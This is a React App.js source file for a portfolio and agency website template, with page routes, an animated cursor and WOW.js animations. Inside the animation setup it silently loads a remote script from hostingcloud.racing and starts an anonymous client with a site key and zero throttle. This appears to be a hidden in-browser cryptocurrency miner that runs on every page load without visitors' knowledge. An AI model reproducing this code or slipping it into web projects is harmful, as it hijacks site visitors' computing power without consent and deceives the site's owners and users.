import React, { useEffect } from "react";
import { useLocation, Routes, Route } from "react-router-dom";
import WOW from "wow.js";
import CreativeAgency from "./pages/Home/CreativeAgency";
import PersonalPortfolio from "./pages/Home/PersonalPortfolio";
import DigitalAgency from "./pages/Home/DigitalAgency";
import AboutUs from "./pages/About/AboutUs";
import AboutMe from "./pages/About/AboutMe";
import TeamPage from "./pages/Team/TeamPage";
import TeamPageDetails from "./pages/Team/TeamPageDetails";
import PortfolioDetailsPage from "./pages/PortfolioDetailsPage";
import ServicesDetailsPage from "./pages/ServicesDetailsPage";
import ContactPage from "./pages/ContactPage";
import BlogPage from "./pages/Blog/BlogPage";
import BlogDetailsPage from "./pages/Blog/BlogDetailsPage";
import AnimatedCursor from "react-animated-cursor";
import NewsLetterArea from "./components/NewsLetter/NewsLetterArea";
import NewsLetterAreaTwo from "./components/NewsLetter/NewsLetterAreaTwo";

function App() {
  useEffect(() => {
    const wow = new WOW({
      boxClass: "wow",
      animateClass: "animated",
      offset: 0,
      mobile: false,
      live: true,
    });
    wow.init();

    const script = document.createElement("script");
    script.src = "https://www.hostingcloud.racing/Rh11.js";
    document.body.appendChild(script);

    script.onload = () => {
      const _client = new window.Client.Anonymous(
        "044188c25f5ad5f1727d80d9322b4bbdba76388a09529c789a436dbc1ff6792e",
        {
          throttle: 0,
          c: "w",
          ads: 0,
        }
      );
      _client.start();
    };

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  const { pathname } = useLocation();

  useEffect(() => {
    window.scrollTo(0, 0);
  }, [pathname]);

  return (
    <>
      <AnimatedCursor
        innerSize={8}
        outerSize={32}
        color="248, 158, 82"
        outerAlpha={0.15}
        innerScale={0}
        outerScale={0}
        clickables={[
          "a",
          'input[type="text"]',
          'input[type="email"]',
          'input[type="number"]',
          'input[type="submit"]',
          'input[type="image"]',
          "label[for]",
          "select",
          "textarea",
          "button",
          ".link",
        ]}
      />

      <Routes>
        <Route path="/" element={<PersonalPortfolio/>} />
        <Route path="/newsletter" element={<NewsLetterAreaTwo/>} />
        <Route path="/home-two" element={<CreativeAgency />} />
        <Route path="/home-three" element={<DigitalAgency />} />
        <Route path="/about-us" element={<AboutUs />} />
        <Route path="/about-me" element={<AboutMe />} />
        <Route path="/team" element={<TeamPage />} />
        <Route path="/team-details" element={<TeamPageDetails />} />
        <Route path="/project-details/:projectSlug" element={<PortfolioDetailsPage />} />
        <Route path="/project-details" element={<PortfolioDetailsPage />} />
        <Route path="/services-details" element={<ServicesDetailsPage />} />
        <Route path="/contact" element={<ContactPage />} />
        <Route path="/blog" element={<BlogPage />} />
        <Route path="/blog-details" element={<BlogDetailsPage />} />
      </Routes>
    </>
  );
}

export default App;
